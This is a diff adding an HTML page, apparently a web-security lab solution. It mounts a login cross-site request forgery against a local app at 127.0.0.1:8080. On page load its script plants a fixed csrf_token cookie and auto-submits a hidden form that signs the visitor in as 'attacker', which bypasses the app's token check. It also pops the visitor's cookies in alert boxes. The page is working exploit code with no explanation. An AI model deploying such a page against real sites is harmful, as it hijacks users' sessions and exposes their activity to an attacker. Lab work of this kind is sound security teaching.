@@ -1,0 +1,35 @@
+<head>
+<script>
+function first(){
+
+    document.cookie="csrf_token=d5a07466b10bf4dd46cd14a6f50d5a05";
+    alert(document.cookie)
+    document.Form2.submit();
+    alert(document.cookie)
+    console.log(1);
+}
+</script>
+</head>
+<body onload="first()" onchange="alert(document.cookie)">
+  <form action="http://127.0.0.1:8080/search" method="GET" name="Form1"> 
+    <input type="hidden" name="csrfdefense" value="1"/>
+    <input type="hidden" name="xssdefense" value="0"/>
+  </form>
+
+  <form action="http://127.0.0.1:8080/login" method="POST" name="Form2"> 
+    <input type="hidden" name="csrfdefense" value="1"/>
+    <input type="hidden" name="xssdefense" value="0"/>
+    <input type="hidden" name="username" value="attacker"/>
+    <input type="hidden" name="password" value="l33th4x"/>
+    <input type="hidden" name="csrf_token" value="d5a07466b10bf4dd46cd14a6f50d5a05"/>
+  </form>
+  <form action="http://127.0.0.1:8080/login" method="POST" name="Form3"> 
+    <input type="hidden" name="csrfdefense" value="1"/>
+    <input type="hidden" name="xssdefense" value="0"/>
+    <input type="hidden" name="username" value="attacker"/>
+    <input type="hidden" name="password" value="l33th4x"/>
+    <input type="hidden" name="csrf_token" value="d5a07466b10bf4dd46cd14a6f50d5a05"/>
+  </form>
+ 
+</body>
+
